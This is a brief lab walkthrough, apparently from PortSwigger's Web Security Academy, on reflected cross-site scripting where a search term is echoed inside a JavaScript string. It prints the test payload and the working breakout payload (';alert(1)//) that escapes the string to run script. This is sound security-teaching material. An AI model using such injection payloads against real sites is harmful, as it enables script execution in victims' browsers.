
# Reflected XSS into a JavaScript string with angle brackets HTML encoded

This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string. To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.

---------------------------------------------

References:

- https://portswigger.net/web-security/cross-site-scripting/contexts




<img width="855" height="225" alt="1" src="https://github.com/user-attachments/assets/d5899647-1558-46de-80be-f0be7be2fbb1" />


---------------------------------------------


Searching for `aaaa` produces a page containing the following code:



<img width="809" height="64" alt="2" src="https://github.com/user-attachments/assets/5c4c5b4c-7fd4-42af-a5ce-ba35375fda0d" />


Start by testing a payload such as:

```
';alert(1);echo 'a
```

We see the code is now:



<img width="808" height="61" alt="3" src="https://github.com/user-attachments/assets/43c487bc-1a66-4c79-a72f-997d67d3b9a3" />


This payload causes the alert to appear:

```
';alert(1)//
```



<img width="674" height="171" alt="4" src="https://github.com/user-attachments/assets/cfe1a599-30bb-46e5-bcdb-427780cb0f48" />

